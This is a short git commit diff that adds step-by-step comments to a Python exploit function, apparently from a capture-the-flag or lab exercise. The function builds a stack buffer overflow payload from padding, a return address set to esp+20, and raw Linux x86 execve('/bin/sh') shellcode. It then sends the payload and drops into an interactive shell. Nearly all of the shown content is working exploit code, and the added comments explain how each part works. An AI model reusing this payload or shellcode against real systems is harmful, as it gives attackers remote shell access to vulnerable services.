3d1fe830216b34a63b0f3803e14060a0d7b58655
infinitie <infinitiecity@gmail.com>
2026-05-21 12:38:42 +0300

    Annotation of the code

--- python/test.py
+++ python/test.py
@@ -22,11 +22,17 @@ def leak(r):
 
 
 def exploit(esp):
+    # 1. Construct the Stage 2 payload
     buff = b"A"*20
+    # 2. The return address should point to the shellcode, which we will place at esp+20
     eip=p32(esp+20)
+    # 3. The shellcode is a standard execve("/bin/sh") shellcode for Linux x86
     shellc0de = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+    # 4. Combine everything into the final payload
     payload = buff+eip+shellc0de
+    # 5. Send the payload to the server
     print("[+]Sending payload")
+    # 6. Use interactive mode to keep the connection open and interact with the shell
     r.send(payload)
     r.interactive()
     
